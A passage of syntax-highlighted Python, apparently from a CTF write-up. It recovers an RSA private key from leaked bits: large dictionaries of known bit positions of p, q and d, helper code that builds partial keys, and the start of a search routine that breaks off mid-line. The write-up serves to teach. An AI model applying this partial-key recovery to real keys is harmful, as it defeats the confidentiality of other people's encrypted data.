class="number">12</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">483</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">406</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">115</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">301</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">490</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">502</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">231</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">404</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">344</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">463</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">157</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">255</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">386</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">373</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">360</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">148</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">472</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">262</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">185</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">214</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">455</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">445</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">503</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">298</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">376</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">210</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">163</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">111</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">244</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">261</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">303</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">259</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">215</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">140</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">443</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">    hint3 = &#123;<span class="number">891</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">74</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">129</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">880</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">361</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1012</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">529</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">500</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">405</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">763</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">637</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">564</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">941</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">923</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1014</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">670</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">558</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">716</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">208</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">130</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">634</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">661</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">862</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">796</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">761</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">752</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">818</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">797</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">337</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">367</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">470</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">624</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">522</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">554</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">583</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">836</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">715</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">484</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">876</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">165</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">842</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">442</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">927</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">586</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">886</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">663</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">947</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">906</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">365</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">936</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">228</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">366</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">717</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">800</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">662</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">970</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">986</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">287</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">597</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">783</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">805</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">671</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">540</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">153</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">577</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">543</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">414</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">626</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">810</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">905</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">602</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">537</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">374</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">137</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">532</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">333</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">653</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1018</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">639</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">826</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">489</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">858</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">516</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">149</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">945</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">694</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">186</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">297</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">103</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">437</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">802</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">921</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">728</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">879</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">953</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">459</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">559</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">610</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">341</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">299</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">952</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">741</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">946</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">696</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">266</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">829</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">908</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">873</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">658</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">798</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">621</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">238</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">654</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">925</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">391</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">598</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">677</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">606</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">118</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">973</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">347</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">159</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">668</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">675</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">924</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">890</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">965</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">692</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">782</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">817</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">889</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">515</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">433</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">356</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">845</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">979</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">785</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">546</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">824</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">704</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">510</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">710</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1022</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">647</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">465</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">245</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">850</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">657</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1007</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">807</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">328</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">292</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">355</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">596</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">275</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1004</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">594</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">446</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">994</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">616</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">900</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">563</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">745</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">536</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">726</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">751</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">781</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">988</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">768</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">688</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">954</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">976</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">868</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">723</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">131</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">794</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">513</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">914</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">641</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">319</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">629</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">620</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">711</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">601</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">531</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">393</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">168</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">950</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">488</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">679</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">568</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">545</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">680</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1008</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">514</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">746</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">436</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">139</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">695</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">584</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">828</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">251</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">691</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">394</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">655</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">544</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">565</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">685</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">720</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">178</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">667</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">403</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">697</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">138</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">659</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">960</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">600</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">579</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">211</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">82</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">209</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">226</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">753</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">874</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">903</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">358</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">141</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getnum</span>(<span class="params">hint, bit</span>):</span></span><br><span class="line">        s = [<span class="string">&#x27;?&#x27;</span>] * bit</span><br><span class="line">        <span class="keyword">for</span> tmp <span class="keyword">in</span> hint.items():</span><br><span class="line">            s[tmp[<span class="number">0</span>]] = tmp[<span class="number">1</span>]</span><br><span class="line">        ss = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> ss.join(s)</span><br><span class="line"></span><br><span class="line">    p_corr = getnum(hint1, <span class="number">512</span>)</span><br><span class="line">    q_corr = getnum(hint2, <span class="number">512</span>)</span><br><span class="line">    d_corr = getnum(hint3, <span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">return</span> n, e, c, p_corr, q_corr, d_corr, hint3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="comment"># fn: å‡½æ•°å‚æ•°æ˜¯æ•°æ®åˆ—è¡¨çš„ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    N, e, c, p_corr, q_corr, d_corr, hint_d = get_params_prob()</span><br><span class="line">    MY_SIZE = <span class="number">508</span></span><br><span class="line">    my_hint_d = &#123;x: y <span class="keyword">for</span> x, y <span class="keyword">in</span> hint_d.items() <span class="keyword">if</span> x &lt; MY_SIZE&#125;</span><br><span class="line">    l, r = args</span><br><span class="line">    <span 